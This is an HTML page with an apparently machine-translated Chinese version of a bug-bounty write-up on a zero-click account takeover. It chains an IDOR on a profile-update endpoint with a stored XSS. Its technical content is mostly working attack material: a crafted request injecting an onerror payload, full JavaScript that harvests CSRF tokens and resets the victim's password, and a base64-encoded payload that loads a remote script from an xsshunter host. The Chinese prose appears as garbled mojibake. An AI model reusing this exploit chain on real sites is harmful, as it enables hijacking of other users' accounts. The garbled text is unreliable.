<html>
<head>
<title>Zero Click To Account Takeover (IDOR + XSS)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é›¶ç‚¹å‡»è´¦æˆ·æ¥ç®¡(IDOR + XSS)</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4?source=collection_archive---------0-----------------------#2022-12-21">https://infosecwriteups.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4?source=collection_archive---------0-----------------------#2022-12-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cf52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">äº²çˆ±çš„æœ‹å‹ä»¬ï¼Œæ‚¨å¥½ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯å…³äºæˆ‘å¯¹BugCrowdç¨‹åºçš„ä¸€ä¸ªå‘ç°ï¼Œè¯¥ç¨‹åºå¯¼è‡´æ”»å‡»è€…ä½¿ç”¨IDORåœ¨å—å®³è€…ä¸ªäººèµ„æ–™ä¸Šæ³¨å…¥XSSæœ‰æ•ˆè½½è·ï¼Œå¹¶å‘é€æ›´æ–°å¯†ç åŠŸèƒ½çš„è¯·æ±‚ï¼Œç›´åˆ°æ›´æ”¹å—å®³è€…çš„å¯†ç ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/9dabc2dafd331f0a665d350013c20358.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sa8VMq2rSw7GJPbc3Og3Rg.png"/></div></div></figure></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="587d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¾¦æŸ¥æ˜¯è™«å­èµé‡‘æœ€é‡è¦çš„éƒ¨åˆ†ã€‚ä½ èŠ±å¤šå°‘æ—¶é—´ä¾¦å¯Ÿï¼Œä½ å°±æœ‰æ›´å¤šçš„æœºä¼šæ‰¾åˆ°å…³é”®çš„æ¼æ´ã€‚æ˜“å—æ”»å‡»çš„åŸŸåè¢«è¯¥å…¬å¸æ”¶è´­ï¼Œæˆ‘ä½¿ç”¨äº†<a class="ae le" href="http://crunchbase.com/" rel="noopener ugc nofollow" target="_blank"> Crunchbase </a>å’ŒGoogle Dorkæ¥äº†è§£ã€‚æˆ‘åœ¨è¿™ä¸ªæ–°èµ„äº§ä¸Šå‘ç°äº†2ä¸ªP1ã€1ä¸ªP2å’Œ2ä¸ªP3ã€‚</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="2785" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">IDORæ˜¯æ›´æ–°é…ç½®æ–‡ä»¶ä¸Šæœ€ç®€å•çš„IDORç±»å‹ï¼Œæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡æ›´æ”¹<strong class="jp ir">æ•°æ®[ç”¨æˆ·][id] </strong>å€¼å‚æ•°æ¥æ›´æ–°å…¶ä»–ç”¨æˆ·é…ç½®æ–‡ä»¶ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lf"><img src="../Images/418d4b107d342e6794ed414d63566636.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uhVfhop9rmvVv99ZVwC6Og.png"/></div></div></figure><p id="9f89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“æˆ‘å‘ç°è¿™ä¸ªæ¼æ´ï¼Œå†³å®šå‡çº§æ¼æ´ï¼Œç”¨å¦ä¸€ä¸ªä¸œè¥¿ç¼–è¯‘ã€‚æˆ‘æ„è¯†åˆ°æ•°æ®[ç”¨æˆ·][ç…§ç‰‡]åæ˜ åœ¨<strong class="jp ir">img</strong>æ ‡ç­¾çš„srcä¸­ã€‚åœ¨ä¸€ä¸ªé•œå¤´ä¸­ï¼Œæˆ‘æ„è¯†åˆ°èƒ½å¤Ÿå…³é—­IMGæ ‡ç­¾çš„srcå€¼ï¼Œä½†æ˜¯æ— æ³•å…³é—­imgæ ‡ç­¾ã€‚æˆ‘ä½¿ç”¨onerroräº‹ä»¶å¤„ç†ç¨‹åºåœ¨å—å®³è€…å¸æˆ·ä¸Šæ‰§è¡ŒJavascriptã€‚</p><pre class="km kn ko kp gt lg lh li lj aw lk bi"><span id="012a" class="ll lm iq lh b gy ln lo l lp lq">POST /users/update_my_profile HTTP/1.1<br/>Host: <a class="ae le" href="http://www.target.com" rel="noopener ugc nofollow" target="_blank">www.target.com</a></span><span id="f41a" class="ll lm iq lh b gy lr lo l lp lq">...  </span><span id="4efd" class="ll lm iq lh b gy lr lo l lp lq">_method=POST&amp;data[_Token][key]=6e8b90f4e7d7c694735d4f1c83db5968bf295f26&amp;data[User][id]=808265&amp;data[User][photo]=https://s3-us-west-2.amazonaws.com/target/nonexistent.png"+onerror=alert(origin)&amp;data[User][photo_old]=&amp;data[User][name]=Arman.Security&amp;data[User][gender]=m&amp;data[date][day]=&amp;data[date][month]=&amp;data[date][year]=&amp;data[User][mobile_number]=&amp;data[_Token][fields]=fa628e2b05473ddd3cbbee31d2d9c311eba4c9d5%3A&amp;data[_Token][unlocked]=</span></pre><p id="0a62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™ä¸ªå›æŠ¥æ˜¯è¿™æ ·çš„:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lf"><img src="../Images/d27e100072818d8bcc24622293ccf6e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KdHj9J5v5IFSDGVtBP4VCA.png"/></div></div></figure><p id="a482" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªIDORå’ŒXSSï¼Œç°åœ¨æ—¶é—´ä½¿ç”¨XSSå¸æˆ·æ¥ç®¡æˆ–è®¿é—®å—å®³è€…å¸æˆ·çš„ç§äººä¿¡æ¯ã€‚</p><p id="2b12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯¥ç½‘ç«™åœ¨CookieåŸºç¡€ä¸Šå·¥ä½œï¼Œæ¯ä¸ªè¯·æ±‚æœ‰2ä¸ªéªŒè¯ä»¤ç‰Œï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ç¨³å®šçš„ï¼Œå¦ä¸€ä¸ªå¯æ ¹æ®æ¯ä¸ªåŠŸèƒ½è¿›è¡Œæ›´æ”¹ã€‚é‡è¦çš„æ˜¯å¿½ç•¥æ—§å¯†ç æ¥æ›´æ–°å¯†ç :)</p><p id="d95b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä¸å¾—ä¸ç¼–å†™ä¸€ä¸ªæ¼æ´ï¼Œå¼•å¯¼æˆ‘æ”¶é›†æ‰€æœ‰å—å®³è€…ä»¤ç‰Œï¼Œå¹¶åœ¨æ›´æ–°å¯†ç å‡½æ•°ä¸Šæµ‹è¯•å¯å˜ä»¤ç‰Œçš„æ‰€æœ‰æ¨¡å¼ã€‚</p><p id="cea3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™å°±æ˜¯æ¼æ´ä»£ç :</p><pre class="km kn ko kp gt lg lh li lj aw lk bi"><span id="f844" class="ll lm iq lh b gy ln lo l lp lq">url = "https://www.target.com/editar-mi-contrasena";</span><span id="69c6" class="ll lm iq lh b gy lr lo l lp lq">var token_keys_array = [];</span><span id="76ca" class="ll lm iq lh b gy lr lo l lp lq">var token_fields_array = [];</span><span id="188e" class="ll lm iq lh b gy lr lo l lp lq">var params = [];</span><span id="c50c" class="ll lm iq lh b gy lr lo l lp lq">var body = "";</span><span id="9cff" class="ll lm iq lh b gy lr lo l lp lq">var xhr = new XMLHttpRequest();</span><span id="37e5" class="ll lm iq lh b gy lr lo l lp lq">xhr.responseType = "document";</span><span id="4029" class="ll lm iq lh b gy lr lo l lp lq">xhr.open("GET", url, true);</span><span id="2f9a" class="ll lm iq lh b gy lr lo l lp lq">xhr.withCredentials = true;</span><span id="f155" class="ll lm iq lh b gy lr lo l lp lq">var xmlHttpRequest2 = new XMLHttpRequest();</span><span id="eb8c" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.open("POST", "https://www.target.com/editar-mi-contrasena", true);</span><span id="01c0" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");</span><span id="cadc" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Referer", "https://www.target.com/editar-mi-contrasena");</span><span id="7c82" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");</span><span id="594a" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Upgrade-Insecure-Requests", "1");</span><span id="d3f6" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Sec-Fetch-Mode", "navigate");</span><span id="6ca5" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Sec-Fetch-Dest", "document");</span><span id="23da" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Sec-Fetch-User", "?1");</span><span id="dc3a" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.withCredentials = true;</span><span id="0e6f" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.onreadystatechange = function () {</span><span id="1415" class="ll lm iq lh b gy lr lo l lp lq">if (this.readyState == 4 &amp;&amp; this.status == 302) {</span><span id="7081" class="ll lm iq lh b gy lr lo l lp lq">print("response=" + this.responseText);</span><span id="5607" class="ll lm iq lh b gy lr lo l lp lq">print("done");</span><span id="f7df" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="dfd0" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="6e18" class="ll lm iq lh b gy lr lo l lp lq">xhr.onreadystatechange = function() {</span><span id="1ef8" class="ll lm iq lh b gy lr lo l lp lq">if (xhr.readyState == 4){</span><span id="8550" class="ll lm iq lh b gy lr lo l lp lq">xhr.response.querySelectorAll("input[name='data[_Token][key]']").forEach( input =&gt; {</span><span id="efbf" class="ll lm iq lh b gy lr lo l lp lq">token_keys_array.push(input.value)</span><span id="03af" class="ll lm iq lh b gy lr lo l lp lq">});</span><span id="7fdd" class="ll lm iq lh b gy lr lo l lp lq">xhr.response.querySelectorAll("input[name='data[_Token][fields]']").forEach( input =&gt; {</span><span id="00f7" class="ll lm iq lh b gy lr lo l lp lq">token_fields_array.push(input.value)</span><span id="dca0" class="ll lm iq lh b gy lr lo l lp lq">});</span><span id="7f3d" class="ll lm iq lh b gy lr lo l lp lq">for (let b = 0; b &lt; token_fields_array.length; b++) {</span><span id="8121" class="ll lm iq lh b gy lr lo l lp lq">if (b == 2){</span><span id="fdcb" class="ll lm iq lh b gy lr lo l lp lq">body = "_method=POST&amp;data%5B_Token%5D%5Bkey%5D="+token_keys_array[0]+"&amp;data%5BUser%5D%5Bpassword%5D=EvilOrAngel&amp;data%5BUser%5D%5Bpassword_confirmation%5D=EvilOrAngel&amp;data%5B_Token%5D%5Bfields%5D="+encodeURIComponent(token_fields_array[b])+"&amp;data%5B_Token%5D%5Bunlocked%5D=";</span><span id="e296" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.send(body);</span><span id="06b2" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="4167" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="e1f9" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="f925" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="d207" class="ll lm iq lh b gy lr lo l lp lq">xhr.send();</span></pre><p id="17ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†æ¼æ´ä»£ç è½¬æ¢ä¸ºBase64ç¼–ç ï¼Œç„¶åè®¾ç½®imgæ ‡ç­¾çš„idå€¼ï¼Œå¹¶é€šè¿‡<strong class="jp ir">on error = eval(atob(this . id))</strong>æ‰§è¡Œå®ƒã€‚å¤§æ¦‚æ˜¯è¿™æ ·çš„:</p><pre class="km kn ko kp gt lg lh li lj aw lk bi"><span id="1f4a" class="ll lm iq lh b gy ln lo l lp lq">"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</span></pre><p id="2221" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨IDORå¸®åŠ©åœ¨å—å®³è€…å¸æˆ·ä¸Šå­˜å‚¨XSSæœ‰æ•ˆè½½è·ï¼Œç„¶ååˆ©ç”¨å¸®åŠ©æˆ‘ä»¬æ¥ç®¡å—å®³è€…å¸æˆ·ã€‚è½»æ¾ç”·å­©ğŸ˜</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ls"><img src="../Images/6445261c716868c0f3f64f8fd92d863e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ImeysarMqI5j82UO.png"/></div></div></figure><p id="4ca8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae le" href="https://twitter.com/m7arm4n" rel="noopener ugc nofollow" target="_blank">æ¨ç‰¹</a>ğŸ¦</p></div></div>    
</body>
</html>